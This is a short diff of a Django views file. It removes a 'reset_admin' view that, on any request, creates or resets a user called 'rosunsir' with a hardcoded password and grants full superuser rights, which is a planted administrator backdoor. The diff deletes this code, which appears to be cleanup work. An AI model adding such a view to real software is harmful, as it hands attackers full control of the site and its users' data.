@@ -274,15 +274,3 @@ def product_detail(request, product_id):
     return render(request, 'product_detail.html', {
         'product': product
     })
-
-def reset_admin(request):
-    from django.contrib.auth.models import User
-    user, created = User.objects.get_or_create(username='rosunsir')
-    user.set_password('NewPassword456987')
-    user.is_staff = True
-    user.is_superuser = True
-    user.is_active = True
-    user.save()
-    if created:
-        return HttpResponse("Superuser created!")
-    return HttpResponse("Password reset successfully!")
